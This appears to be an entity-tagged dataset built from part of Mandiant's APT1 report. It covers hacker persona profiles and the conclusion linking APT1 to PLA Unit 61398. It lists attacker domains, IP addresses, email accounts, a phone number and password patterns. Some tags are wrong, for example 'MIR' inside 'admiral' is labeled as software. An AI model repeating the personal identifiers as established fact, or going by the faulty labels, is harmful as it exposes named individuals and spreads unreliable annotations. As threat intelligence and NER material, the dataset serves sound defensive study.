Mandiant_APT1_Report,") by blocking 
additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 52 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, Hacker Profile: ,O
Mandiant_APT1_Report,Ugly Gorilla,identity
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,Wang Dong,identity
Mandiant_APT1_Report,"/汪东)

The story of “",O
Mandiant_APT1_Report,Ugly Gorilla,identity
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,) dates ,O
Mandiant_APT1_Report,back to 2004,timestamp
Mandiant_APT1_Report,". 
A then-professor named ",O
Mandiant_APT1_Report,Zhang Zhaozhong,identity
Mandiant_APT1_Report," (张召
忠), now a retired rear ad",O
Mandiant_APT1_Report,MIR,software
Mandiant_APT1_Report,"al, was in the process 
of helping to shape the future of ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s information 
warfare strategy.40 Professor ",O
Mandiant_APT1_Report,Zhang,identity
Mandiant_APT1_Report," was already a 
strong advocate for the “informationization” of military 
units, and had published several works on military 
strategy including “Network Warfare” (网络战争) and 
“Winning the Information War” (打赢信息化战争). As 
Director of the “Military Technology and Equipment” 
(军事科技与装备) department at ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s National 
Defense University (国防大学), professor ",O
Mandiant_APT1_Report,Zhang,identity
Mandiant_APT1_Report," was 
invited to take part in an event titled “Outlook 2004: 
The International Strategic Situation” in ",O
Mandiant_APT1_Report,January 2004,timestamp
Mandiant_APT1_Report,".

During the online question and answer session 
hosted by the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, Daily’s (解放军报) ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," Military 
Online (中国军网), one young man with the nickname 
“",O
Mandiant_APT1_Report,Greenfield,identity
Mandiant_APT1_Report,"” (绿野) posed a particularly prescient 
question.

“Professor ",O
Mandiant_APT1_Report,Zhang,identity
Mandiant_APT1_Report,", I read your book ’network warfare‘ and was deeply impressed 
by the views and arguments in the book. It is said that the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," military has set up 
a dedicated network force referred to as a ‘cyber army.’ Does ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," have a similar 
force? Does ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," have cyber troops?” 

— ",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,16 Jan 2004,timestamp
Mandiant_APT1_Report,"

Like all users of the ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, Military Online (,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"mil) forums, “",O
Mandiant_APT1_Report,Greenfield,identity
Mandiant_APT1_Report,"” was required to sign up with an email 
address and specify a small bit of information about himself. Thankfully, the Internet’s tendency to immortalize data 
preserved the profile details for us.

40 http://www.",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"mil.com.cn/site1/gflt/2004-09/30/content_705216.htm

FIGure 26: Professor ",O
Mandiant_APT1_Report,Zhang,identity
Mandiant_APT1_Report, (张召忠) ,O
Mandiant_APT1_Report,16 Jan 2004,timestamp
Mandiant_APT1_Report,", 
source http://www.",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"mil.com.cn/site1/gflt/2004-09/30/
content_705216.htm



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 53 www.mandiant.com

FIGure 27: ",O
Mandiant_APT1_Report,uglyGorilla,identity
Mandiant_APT1_Report," Chinamil profile, source: http://bbs.",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"mil.com.cn/forum/bbsui.jsp?id=(o)5681



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 54 www.mandiant.com

FIGure 28: ",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"mil profile translated by translate.google.com/

Thus, the persona we call “",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,") was first documented. In addition to his email address, ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report," listed his “real 
name” as “",O
Mandiant_APT1_Report,JackWang,identity
Mandiant_APT1_Report,"”. 

Within the year, we saw the first evidence of ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report, honing the tools of his trade. On ,O
Mandiant_APT1_Report,"October 25, 2004",timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report," registered the 
now infamous “",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,” zone. The “,O
Mandiant_APT1_Report,hugesoft>.org,ioc
Mandiant_APT1_Report,” zone and its many ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"-attributed hostnames have remained 
active and under the continuous ownership of ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,", and are still active as of the time of this report. Registration 
information was most recently updated on ",O
Mandiant_APT1_Report,"September 10, 2012",timestamp
Mandiant_APT1_Report,", extending the registration period for the zone well into 
",O
Mandiant_APT1_Report,2013,timestamp
Mandiant_APT1_Report,. We may see ,O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report," relinquish this and other attributed zones as a result of this reporting, in an effort to deter further 
tracking and attribution.

In ",O
Mandiant_APT1_Report,2007,timestamp
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report," authored the 
first known sample of the 
",O
Mandiant_APT1_Report,MANITSME,malware
Mandiant_APT1_Report," family of malware 
and, like a good artist, left his 
clearly identifiable signature in 
the code: “v1.0 No Doubt to 
Hack You, Writed by ",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,", 
",O
Mandiant_APT1_Report,06/29/2007,timestamp
Mandiant_APT1_Report,”[sic]. ,O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,"’s 
tendency to sign his work is 
present in the strings he chooses 
for hostnames and even within 
the communications protocols 
his backdoors use. For example, 

what is a meat chicken?!? 
Chinese Hacker Slang: “rouji” ( 肉鸡 ) — Meat Chicken 
n. — An infected computer

Example strings from ",O
Mandiant_APT1_Report,MANITSME,malware
Mandiant_APT1_Report," samples: 
“",O
Mandiant_APT1_Report,d:\My Documents\Visual Studio Projects\rouji\SvcMain.pdb,ioc
Mandiant_APT1_Report,"”

Examples from other malware… 
 “connecting to rouji” 
 “welcome to ***(rouji)”



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 55 www.Mandiant.com

hostnames within other ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,-attributed FQDNs such as “,O
Mandiant_APT1_Report,arrowservice.net,ioc
Mandiant_APT1_Report,” and even the newer “,O
Mandiant_APT1_Report,msnhome.org,ioc
Mandiant_APT1_Report,"” 
continue to leave ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,’s imprint (note the “,O
Mandiant_APT1_Report,ug,identity
Mandiant_APT1_Report,"” in the domains):
»» ",O
Mandiant_APT1_Report,ug-opm.hugesoft.org,ioc
Mandiant_APT1_Report,"
»» ",O
Mandiant_APT1_Report,ug-rj.arrowservice.net,ioc
Mandiant_APT1_Report,"
»» ",O
Mandiant_APT1_Report,ug-hst.msnhome.org,ioc
Mandiant_APT1_Report,"

Though these kinds of obvious attribution links tapered off as ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report," became more experienced, the protocol signatures of 
his tools such as ",O
Mandiant_APT1_Report,MANITSME,malware
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,WEBC2-UGX,malware
Mandiant_APT1_Report, continue to be used by ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, attackers based out of ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,".

",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,’s consistent use of the username “,O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,"” across various Web accounts has left a thin but strong thread of 
attribution through many online communities. In most instances, content such as hacking tools, information security 
topics, and association with the ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," locality are reasonable ways to eliminate false positives. For example, ",O
Mandiant_APT1_Report,in February of 2011,timestamp
Mandiant_APT1_Report,", the disclosure of all registered “rootkit.com” accounts published by Anonymous included the user 
“",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,” with the registered email address ,O
Mandiant_APT1_Report,uglygorilla@163.com,identity
Mandiant_APT1_Report,". This is the same email used to register for the 
",O
Mandiant_APT1_Report,2004,timestamp
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, forum and the zone ,O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,". Included in the rootkit.com leaked account information was the IP address 
",O
Mandiant_APT1_Report,58.246.255.28,ioc
Mandiant_APT1_Report,", which was used to register ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,’s account directly from the previously discussed ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," home range: 
",O
Mandiant_APT1_Report,58.246.0.0/15,ioc
Mandiant_APT1_Report,".

In a few of these accounts, ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report, has listed something other than “,O
Mandiant_APT1_Report,JackWang,identity
Mandiant_APT1_Report,” as his real name. On ,O
Mandiant_APT1_Report,"February 2, 2006",timestamp
Mandiant_APT1_Report,", a 
user named “",O
Mandiant_APT1_Report,UglyGorilla,identity
Mandiant_APT1_Report,” uploaded a file named “,O
Mandiant_APT1_Report,mailbomb_1.08.zip,ioc
Mandiant_APT1_Report,"” (a bulk email tool) to the Chinese developer site 
PUDN (www.pudn.com). His account details from PUDN included the real name “",O
Mandiant_APT1_Report,Wang Dong,identity
Mandiant_APT1_Report,"” (汪东).

Figure 29: ",O
Mandiant_APT1_Report,Wang Dong,identity
Mandiant_APT1_Report,"’s uploaded Files to pudn.com

It is important to note two things at this point. First, Chinese names begin with the surname. So “",O
Mandiant_APT1_Report,Wang,identity
Mandiant_APT1_Report,"” is the last 
name in 汪东. Second, it is a fairly common practice for the Chinese, even in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,", to choose an English first name. 
Thus “",O
Mandiant_APT1_Report,JackWang,identity
Mandiant_APT1_Report,"” may not have been an alias at all. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 56 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, Hacker Profile: ,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,"

Another ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, persona is “,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,"), named for his strong tendency to use variants of that name in almost all 
accounts he creates and uses from his attack infrastructure. ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report," may have taken his name from the video game 
“Defense of the Ancients” which is commonly abbreviated ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,", though we have yet to observe any direct link or other 
direct reference to the game.

We have monitored the creation of dozens of accounts, including ",O
Mandiant_APT1_Report,d0ta010@hotmail.com,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,dota.d013@gmail.com,identity
Mandiant_APT1_Report,", 
and have often seen ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report, create several sequential accounts (for example ,O
Mandiant_APT1_Report,dota.d001,identity
Mandiant_APT1_Report, through ,O
Mandiant_APT1_Report,dota.d015,identity
Mandiant_APT1_Report,") at web-
based email services. Most often these accounts are used in social engineering and phishing attacks or as the contact 
email address when signing up for other services. For example, ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report, (originating from the ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," home range IP 
address ",O
Mandiant_APT1_Report,58.247.26.59,ioc
Mandiant_APT1_Report,) with a Simplified Chinese keyboard setting used the email address “,O
Mandiant_APT1_Report,d0ta001@hotmail.com,identity
Mandiant_APT1_Report,"” 
from his US hop to register the ",O
Mandiant_APT1_Report,Facebook,org
Mandiant_APT1_Report, user “,O
Mandiant_APT1_Report,do.ta.5011,identity
Mandiant_APT1_Report,”(,O
Mandiant_APT1_Report,Facebook,org
Mandiant_APT1_Report," user id: 100002184628208).

Some services, such as ",O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report,’s ,O
Mandiant_APT1_Report,Gmail,software
Mandiant_APT1_Report,", require users to provide a phone number during the registration process to 
which they send a validation “text message” containing a verification code. The user must then input the verification 
code on the website to finalize registration. In an observed session on a compromised machine, ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report," used the phone 
number “",O
Mandiant_APT1_Report,159-2193-7229,identity
Mandiant_APT1_Report,” to receive a verification text message from ,O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report,", which he then submitted to their page 
within seconds. 

Telephone numbers in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," are organized into a hierarchy containing an area code, prefix, and line number similar 
to phone numbers in the ",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report,", with the addition that a few area codes are allocated for use by mobile phone 
providers. The phone number “",O
Mandiant_APT1_Report,159-2193-7229,identity
Mandiant_APT1_Report,"” breaks down into the “159” area code, which indicates a mobile 
phone provided by ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," Mobile, and the prefix “2193”, which indicates a ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," mobile number. This means at the 
very least that the number was initially allocated by ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report, Mobile for use in ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,. The speed of ,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,"’s response 
also indicates that he had the phone with him at the time.

We have also observed ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report, using the names ,O
Mandiant_APT1_Report,Rodney,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Raith,identity
Mandiant_APT1_Report,", to communicate via email in fluent English 
with various targets including South East Asian military 
organizations in ",O
Mandiant_APT1_Report,Malaysia,country
Mandiant_APT1_Report, and the ,O
Mandiant_APT1_Report,Philippines,country
Mandiant_APT1_Report,". It is unclear 
if this ",O
Mandiant_APT1_Report,Gmail,software
Mandiant_APT1_Report," account is used exclusively for facilitating his 
",O
Mandiant_APT1_Report,CNO,org
Mandiant_APT1_Report," mission, but much of the traffic indicates its use in 
both simple phishing attacks, as well as more sophisticated 
email based social engineering.

",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,": a harry “Poter” fan?
The ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report," persona also appears to be a 
fan of the popular “Harry Potter” character, 
frequently setting accounts “security 
questions” such as “Who is your favorite 
teacher?” and “Who is your best childhood 
friend?” to the values “Harry” and “Poter” and 
creating accounts such as ",O
Mandiant_APT1_Report,poter.spo1@gmail.com,identity
Mandiant_APT1_Report," with the alternate email address set to 
",O
Mandiant_APT1_Report,dota.sb005@gmail.com,identity
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 57 www.mandiant.com

Figure 30: ",O
Mandiant_APT1_Report,dota.d001@gmail.com,identity
Mandiant_APT1_Report," (inbox view)41

When creating dozens, or hundreds, of accounts in online communities and on victim systems, password management 
becomes a significant undertaking. Consequently, most ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers use passwords that are either pattern-based, 
such as the keyboard pattern “1qaz2wsx” or highly memorable, using “rootkit” as a password on the information 
security research site rootkit.com. Like many ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," attackers, ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report," frequently uses keyboard based patterns as 
passwords such as “1qaz@WSX#EDC”. However, there is one password “2j3c1k” extensively used by ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report," that is not 
based on a keyboard pattern, though he may not be the only ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actor that uses it. A numbered “j”, followed by a 
numbered “c”, and then a numbered “k” is likely shorthand (“j”/”c”/”k”) for the ju/chu/ke (局／处／科) organizational 
structure (translated to Bureau/Division (or Office)/Section) widely used within ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,General Staff Department,org
Mandiant_APT1_Report," 
organizations. ",O
Mandiant_APT1_Report,Project 2049,org
Mandiant_APT1_Report, describes the typical ,O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report," organizational structure as, “Bureau-level directors … oversee 
between six and 14 subordinate sites or offices [chu; 处]… Sites/offices under bureaus are further divided into sections 

41 This is a screen capture of ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report, accessing his Gmail account while using a compromised system on ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s attack infrastructure.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 58 www.mandiant.com

[ke; 科].42 Given this pattern, it is likely that the password “2j3c1k” stands for 2nd Bureau [",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report,"], 3rd Division, 
1st Section, demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd 
Bureau.

Attempting to track the ",O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report," persona back to a particular individual is difficult; the trail of his activity does not link 
as clearly to a real world identity. However, ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, has been able to establish a clear link between ,O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report,". 
Specifically, we have observed the two using shared ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," infrastructure, FQDNs, and egress IP address ranges. The 
coordination of this shared infrastructure, combined with their close proximity and association with ",O
Mandiant_APT1_Report,Unit 61398,threat_actor
Mandiant_APT1_Report," makes 
it highly likely that, at the very least, ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report," know each other personally and likely even work together.

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, Hacker Profile: ,O
Mandiant_APT1_Report,SUPERHARD,identity
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,Mei Qiang,identity
Mandiant_APT1_Report,"/梅强)

The third and final persona we are revealing has been dubbed “",O
Mandiant_APT1_Report,SUPERHARD,identity
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report,). ,O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report," was first observed as a tool 
author, and is either the creator or a significant contributor to the ",O
Mandiant_APT1_Report,AURIGA,malware
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,BANGAT,malware
Mandiant_APT1_Report," malware families (covered 
in Appendix C: The Malware Arsenal). Similarly to ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report," signs much of his work by embedding strings within the 
tools. In particular, elements of the portable executable (PE) file’s VS_VERSIONINFO structure are frequently set to 
“",O
Mandiant_APT1_Report,SUPERHARD,identity
Mandiant_APT1_Report,",” or cmd.exe copies are modified from “",O
Mandiant_APT1_Report,Microsoft corp.,org
Mandiant_APT1_Report,” to “,O
Mandiant_APT1_Report,superhard corp.,identity
Mandiant_APT1_Report,"”

Additionally, many of ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report,’s tools contain driver modules designed to be loaded into the ,O
Mandiant_APT1_Report,Windows,software
Mandiant_APT1_Report," kernel in order to 
subvert elements of the system. While not unique for ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," coders, this level of development expertise is certainly 
a discriminator that puts ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report, into a smaller group of highly capable developers within ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". Often, ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report,"’s tools are 
observed in use by other ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," personae and in several instances, other ",O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report, groups we track. Given that ,O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report,"’s tools 
are used by other ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," actors, and that there are no indications that ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report," is a full-time operator, we believe that ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report," is 
primarily involved in research and development for ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,".

Once again, in tracking ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report," we are fortunate to have access to the accounts disclosed from rootkit.com. The rootkit.
com account “",O
Mandiant_APT1_Report,SuperHard_M,identity
Mandiant_APT1_Report,” was originally registered from the IP address ,O
Mandiant_APT1_Report,58.247.237.4,ioc
Mandiant_APT1_Report,", within one of the known 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," egress ranges, and using the email address “",O
Mandiant_APT1_Report,mei_qiang_82@sohu.com,identity
Mandiant_APT1_Report,”. We have observed the ,O
Mandiant_APT1_Report,DOTA,identity
Mandiant_APT1_Report," persona 
emailing someone with the username ",O
Mandiant_APT1_Report,mei_qiang_82,identity
Mandiant_APT1_Report,. The name “,O
Mandiant_APT1_Report,Mei Qiang,identity
Mandiant_APT1_Report,"” (梅强) is a reasonably common Chinese 
last/first name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of 
their birth year, suggesting that ",O
Mandiant_APT1_Report,SUPERHARD,identity
Mandiant_APT1_Report, is in fact ,O
Mandiant_APT1_Report,Mei Qiang,identity
Mandiant_APT1_Report, and was born in ,O
Mandiant_APT1_Report,1982,timestamp
Mandiant_APT1_Report,". Unfortunately, there are several 
“",O
Mandiant_APT1_Report,Mei Qiang,identity
Mandiant_APT1_Report,” identities online that claim a birth year of ,O
Mandiant_APT1_Report,1982,timestamp
Mandiant_APT1_Report,", making attribution to an individual difficult.

Fortunately, we can use ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report,"’s email address to connect him to a number of Websites and forums on which he 
registered and contributed using that address. Many of these accounts reveal details that reinforce ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report,"’s link to the 
“",O
Mandiant_APT1_Report,mei_qiang_82@sohu.com,identity
Mandiant_APT1_Report,”43 email address and ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," affiliation, such as ",O
Mandiant_APT1_Report,SH,identity
Mandiant_APT1_Report," offering to write Trojans for money, his 
involvement with malicious Windows kernel research (incidentally, also commented on by “",O
Mandiant_APT1_Report,greenfield,identity
Mandiant_APT1_Report,"”, possibly ",O
Mandiant_APT1_Report,UG,identity
Mandiant_APT1_Report,"), 
and more recently, being local to ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,"’s Pudong New Area.44

42 ",O
Mandiant_APT1_Report,Mark A. Stokes,identity
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Jenny Lin,identity
Mandiant_APT1_Report,", and ",O
Mandiant_APT1_Report,L.C. Russell Hsiao,identity
Mandiant_APT1_Report,", “",O
Mandiant_APT1_Report,The Chinese People’s Liberation Army,org
Mandiant_APT1_Report," Signals Intelligence and Cyber Reconnaissance 
Infrastructure,” ",O
Mandiant_APT1_Report,Project 2049 Institute,org
Mandiant_APT1_Report, (,O
Mandiant_APT1_Report,2011,timestamp
Mandiant_APT1_Report,"): 6-7, http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf, 
accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".
43 Sohu.com is a popular Chinese search engine, webmail, and Internet advertising company based out of ",O
Mandiant_APT1_Report,Beijing,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,".
44 hxxp://tuziw.com/index.php?m=ta&id=1864863532



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 59 www.mandiant.com

ConCLusIon

In a State that rigorously monitors Internet use, it is highly unlikely that the ",O
Mandiant_APT1_Report,Chinese Government,org
Mandiant_APT1_Report," is unaware of an 
attack group that operates from the Pudong New Area of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,. The detection and awareness of ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is made 
even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this 
report. Therefore the most probable conclusion is that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is able to wage such a long-running and extensive cyber 
espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the 
mission, resourcing, and location of ",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report,", we conclude that ",O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report, is ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,". Table 12 summarizes 
the parallels between ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report,".

taBLe 12: Matching characteristics between ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,unit 61398,threat_actor
Mandiant_APT1_Report,"

Characteristic ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, (as directly observed) ,O
Mandiant_APT1_Report,unit 61398,threat_actor
Mandiant_APT1_Report," (as reported)

Mission area »» Steals intellectual property from English-
speaking organizations

»» Targets strategic emerging industries 
identified in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"’s 12th Five Year Plan

»» Conducts computer network operations 
against English-speaking targets

tools, tactics, and 
Procedures (ttPs)

»» Organized, funded, disciplined operators 
with specific targeting objectives and a 
code of ethics (e.g., we have not witnessed 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," destroy property or steal money 
which contrasts most “hackers” and even 
the most sophisticated organize crime 
syndicates)

»» Conducts military-grade computer network 
operations

scale of operations »» Continuously stealing hundreds of terabytes 
from 141 organizations ",O
Mandiant_APT1_Report,since at least 2006,timestamp
Mandiant_APT1_Report,"; 
simultaneously targeting victims across at 
least 20 major industries

»» Size of “hop” infrastructure and continuous 
malware updates suggest at least dozens 
(but probably hundreds) of operators with 
hundreds of support personnel 

»» As part of the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,", has the resources 
(people, money, influence) necessary to 
orchestrate operation at ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s scale

»» Has hundreds, perhaps thousands of 
people, as suggested by the size for their 
facilities and position within the ",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report,"



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 60 www.mandiant.com

Characteristic ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, (as directly observed) ,O
Mandiant_APT1_Report,unit 61398,threat_actor
Mandiant_APT1_Report," (as reported)

expertise of 
personnel

»» English language proficiency

»» Malware authoring

»» Computer hacking

»» Ability to identify data worth stealing in 20 
industries

»» English language requirements

»» Operating system internals, digital signal 
processing, steganography

»» Recruiting from Chinese technology 
universities

Location »» ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, actor used a ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," phone 
number to register email accounts

»» Two of four “home” ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," net blocks 
are assigned to the Pudong New Area

»» Systems used by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders have 
Simplified Chinese language settings

»» An ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," persona’s self-identified location 
is the Pudong New Area

